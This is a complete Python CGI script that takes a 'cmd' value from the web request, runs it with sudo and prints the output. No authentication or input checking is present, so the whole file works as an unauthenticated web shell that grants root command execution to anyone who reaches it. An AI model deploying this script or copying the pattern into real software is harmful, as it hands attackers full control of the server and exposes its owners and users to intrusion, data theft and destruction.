#!/usr/bin/python3
print("content-type:text/plain")
print()

import subprocess as p
import cgi

url=cgi.FieldStorage()
command=url.getvalue("cmd")
output=p.getoutput("sudo "+command)
print(output)

